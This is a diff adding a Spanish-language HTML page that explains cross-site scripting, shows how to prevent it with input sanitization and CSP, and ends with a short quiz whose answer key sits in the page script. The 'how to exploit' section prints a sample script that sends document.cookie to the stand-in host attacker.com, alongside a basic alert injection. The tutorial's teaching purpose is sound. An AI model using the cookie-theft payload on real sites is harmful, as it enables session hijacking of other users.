@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial XSS y Cuestionario</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            max-width: 800px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1, h2 {
+            color: #333;
+        }
+        pre {
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        #quiz {
+            margin-top: 20px;
+        }
+        .question {
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Tutorial: Vulnerabilidad XSS (Cross-Site Scripting)</h1>
+        
+        <h2>¿Qué es XSS?</h2>
+        <p>XSS es una vulnerabilidad de seguridad que permite a un atacante inyectar scripts maliciosos en páginas web vistas por otros usuarios.</p>
+        
+        <h2>Cómo se produce</h2>
+        <p>XSS ocurre cuando una aplicación web incluye datos no confiables en una página web sin la validación o codificación adecuada. Por ejemplo:</p>
+        <pre><code>&lt;input type="text" value="&lt;script&gt;alert('XSS');&lt;/script&gt;"&gt;</code></pre>
+        
+        <h2>Cómo explotarlo</h2>
+        <p>Un atacante podría inyectar un script malicioso en un campo de entrada que luego se muestra a otros usuarios. Por ejemplo:</p>
+        <pre><code>&lt;script&gt;
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://attacker.com/steal?cookie=" + document.cookie);
+    xhr.send();
+&lt;/script&gt;</code></pre>
+        
+        <h2>Cómo solucionarlo</h2>
+        <p>Para prevenir XSS:</p>
+        <ul>
+            <li>Validar y sanitizar todas las entradas de usuario.</li>
+            <li>Utilizar funciones de escape para los datos no confiables antes de insertarlos en el HTML.</li>
+            <li>Implementar Content Security Policy (CSP) para restringir la ejecución de scripts.</li>
+        </ul>
+        <p>Ejemplo de sanitización en JavaScript:</p>
+        <pre><code>function sanitizeInput(input) {
+    return input.replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+}</code></pre>
+        
+        <h2>Cuestionario sobre XSS</h2>
+        <div id="quiz">
+            <div class="question">
+                <p>1. ¿Qué significa XSS?</p>
+                <input type="radio" name="q1" value="a"> a) Cross-Site Scripting<br>
+                <input type="radio" name="q1" value="b"> b) Cross-Site Styling<br>
+                <input type="radio" name="q1" value="c"> c) Cross-Server Scripting<br>
+            </div>
+            <div class="question">
+                <p>2. ¿Cuál de las siguientes es una buena práctica para prevenir XSS?</p>
+                <input type="radio" name="q2" value="a"> a) Permitir que los usuarios ingresen HTML directamente<br>
+                <input type="radio" name="q2" value="b"> b) Sanitizar todas las entradas de usuario<br>
+                <input type="radio" name="q2" value="c"> c) Desactivar JavaScript en el navegador<br>
+            </div>
+            <div class="question">
+                <p>3. ¿Qué puede hacer un atacante con un ataque XSS exitoso?</p>
+                <input type="radio" name="q3" value="a"> a) Robar cookies de sesión<br>
+                <input type="radio" name="q3" value="b"> b) Modificar el contenido de la página<br>
+                <input type="radio" name="q3" value="c"> a y b son correctas<br>
+            </div>
+            <button onclick="checkQuiz()">Enviar respuestas</button>
+        </div>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        function checkQuiz() {
+            const answers = {q1: 'a', q2: 'b', q3: 'c'};
+            let score = 0;
+            let total = Object.keys(answers).length;
+
+            for (let q in answers) {
+                let selected = document.querySelector(`input[name="${q}"]:checked`);
+                if (selected && selected.value === answers[q]) {
+                    score++;
+                }
+            }
+
+            let resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = `<h3>Resultado</h3><p>Has acertado ${score} de ${total} preguntas.</p>`;
+            
+            if (score === total) {
+                resultDiv.innerHTML += '<p>¡Excelente! Has demostrado un buen entendimiento de XSS.</p>';
+            } else if (score > total / 2) {
+                resultDiv.innerHTML += '<p>Buen trabajo, pero aún hay espacio para mejorar. Revisa el tutorial nuevamente.</p>';
+            } else {
+                resultDiv.innerHTML += '<p>Necesitas estudiar más sobre XSS. Te recomiendo releer el tutorial y buscar recursos adicionales.</p>';
+            }
+        }
+    </script>
+</body>
+</html>
